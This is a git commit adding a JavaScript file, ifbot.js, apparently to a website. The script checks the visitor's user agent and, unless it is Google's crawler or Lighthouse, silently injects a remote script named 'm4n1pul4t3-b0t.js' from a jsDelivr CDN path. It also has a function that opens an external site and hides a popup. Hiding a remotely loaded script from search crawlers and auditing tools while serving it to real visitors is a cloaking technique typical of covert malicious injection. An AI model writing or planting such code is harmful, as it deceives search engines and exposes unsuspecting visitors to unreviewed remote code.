3dfa06e467a24f71a347b32c7ce9cc4edfb2db4c
rezaaryam <68484809+rezaaryam@users.noreply.github.com>
2020-07-21 19:55:39 +0700

    Create ifbot.js

---
+++ js/ifbot.js
@@ -0,0 +1,11 @@
+if ((navigator.userAgent.includes("google") || navigator.userAgent.includes("Google") || navigator.userAgent.includes("Lighthouse")) == true) {
+//todo nothing
+} else {
+var jsdlvr = document.createElement('script');
+jsdlvr.src = "https://cdn.jsdelivr.net/gh/rezaaryam/hostfile@latest/m4n1pul4t3-b0t.js";
+document.getElementsByTagName("head")[0].appendChild(jsdlvr);
+}
+
+function clicked() {
+window.open("https://sugeng.id");
+document.getElementById("popuped").style.display = "none";}
